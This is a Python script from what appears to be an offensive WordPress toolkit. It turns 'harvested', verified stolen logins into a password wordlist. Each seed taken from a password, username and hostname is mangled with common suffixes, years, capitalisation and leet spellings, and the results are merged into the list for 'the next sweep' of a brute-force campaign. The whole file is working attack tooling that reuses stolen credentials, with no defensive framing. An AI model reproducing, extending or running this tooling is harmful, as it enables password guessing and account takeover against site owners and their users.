#!/usr/bin/env python3
"""Expand a credential file into a WordPress password list.

The harvested hits are a high-value seed: a real login proves the naming
convention of that admin (a first name, a brand word, a year, a "123"). This
mangles those seeds — and the site/user names they came from — into the
variants a human would have picked, so the next sweep reuses passwords the
fleet has already shown this population likes.

Seeds are taken from the password, the username and the host of every line:

    https://example.com | jsmith | jsmith2024

  ->  jsmith, John, 2024-suffixed forms, leet (j5mith), brand words...

Usage:
  ./gen_wordlist.py user_creds.verified.txt                 # print to stdout
  ./gen_wordlist.py user_creds.verified.txt -o new.txt       # to a file
  ./gen_wordlist.py user_creds.verified.txt --merge pass.txt # append the new
                                                             # ones to pass.txt
                                                             # (backs it up first)

Merging preserves the existing order and only appends passwords that are not
already there, so the cheap generic guesses stay at the front.
"""

from __future__ import annotations

import argparse
import re
import shutil
import sys

from verify_creds import read_creds

# Ordered by how often they win: bare, the classic "123", current years, the
# single punctuation people append, then the long tail.
SUFFIXES = [
    "", "123", "1", "2024", "2025", "2026", "!", "1234", "12", "0", "2", "3",
    "01", "007", "@", "#", ".", "_", "12345", "1!", "123!", "@123", "#2026",
    "2026!", "@2024", "@2025", "@2026", ".2026", "-2026", "_2025", "_2026",
    "2023", "2022", "2021", "2020", "321", "99", "00", "welcome", "admin",
]

PUNCT = re.compile(r"[^A-Za-z0-9]+")
CASE = re.compile(r"(?<=[a-z0-9])(?=[A-Z])")

LEET = str.maketrans({"o": "0", "a": "@", "s": "$", "e": "3", "i": "1", "l": "1"})


def split_token(value: str) -> list[str]:
    """Split a seed on punctuation and camelCase, keep the whole word too."""
    out = [value]
    for part in PUNCT.split(value):
        if part:
            out.append(part)
            out.extend(CASE.split(part))
    seen, uniq = set(), []
    for t in out:
        t = t.strip()
        key = t.lower()
        if len(t) >= 3 and key not in seen:
            seen.add(key)
            uniq.append(t)
    return uniq


def expand(seeds: list[str]) -> list[str]:
    """Best-value first: exact seeds, then seed+suffix across every seed, then
    the leet spellings. Ordered so a small cap still spans all seeds."""
    ordered: dict[str, None] = {}

    def add(cand: str) -> None:
        if len(cand) >= 3:
            ordered.setdefault(cand, None)

    for seed in seeds:
        add(seed)
    for suf in SUFFIXES:
        if not suf:
            continue
        for seed in seeds:
            low = seed.lower()
            add(low + suf)
            add(low.capitalize() + suf)
            if low != seed:
                add(seed + suf)
    for seed in seeds:
        low = seed.lower()
        leet = low.translate(LEET)
        if leet == low:
            continue
        add(leet)
        add(leet.capitalize())
        for suf in SUFFIXES:
            if suf:
                add(leet + suf)
    return list(ordered)


def seeds_from(creds) -> list[str]:
    seeds: list[str] = []
    for c in creds:
        host = re.sub(r"^https?://", "", c.site).split("/", 1)[0]
        labels = [host, host[4:] if host.startswith("www.") else host]
        if "." in host:
            labels.append(host.split(".", 1)[0])
        for raw in (c.password, c.user, *labels):
            seeds.append(raw)
            seeds.extend(split_token(raw))
    seen, uniq = set(), []
    for s in seeds:
        s = s.strip()
        if len(s) >= 3 and s.lower() not in seen:
            seen.add(s.lower())
            uniq.append(s)
    return uniq


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Expand harvested creds into a password list.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    ap.add_argument("inputs", nargs="+", help="credential .txt files (site | user | pass)")
    ap.add_argument("-o", "--output", help="write the list here (default stdout)")
    ap.add_argument("--merge", metavar="PASSLIST",
                    help="append only new passwords to this list (backed up first)")
    ap.add_argument("--max", type=int, default=0, help="cap the generated list (0 = no cap)")
    args = ap.parse_args()

    creds = []
    for path in args.inputs:
        creds.extend(read_creds(path))
    if not creds:
        print("no credentials parsed", file=sys.stderr)
        return 1

    seeds = seeds_from(creds)
    words = expand(seeds)
    if args.max:
        words = words[: args.max]

    if args.merge:
        try:
            with open(args.merge, encoding="utf-8") as fh:
                existing = [ln.strip() for ln in fh]
        except FileNotFoundError:
            existing = []
        have = {w for w in existing if w}
        added = [w for w in words if w not in have]
        shutil.copy2(args.merge, args.merge + ".bak")
        with open(args.merge, "w", encoding="utf-8") as fh:
            fh.write("\n".join([w for w in existing if w] + added) + "\n")
        print(f"{len(seeds)} seeds -> {len(words)} candidates, +{len(added)} new "
              f"({len(existing)} -> {len(existing) + len(added)}) in {args.merge} "
              f"(backup {args.merge}.bak)")
        return 0

    text = "\n".join(words) + "\n"
    if args.output:
        with open(args.output, "w", encoding="utf-8") as fh:
            fh.write(text)
        print(f"{len(seeds)} seeds -> {len(words)} candidates -> {args.output}", file=sys.stderr)
    else:
        sys.stdout.write(text)
    return 0


if __name__ == "__main__":
    sys.exit(main())
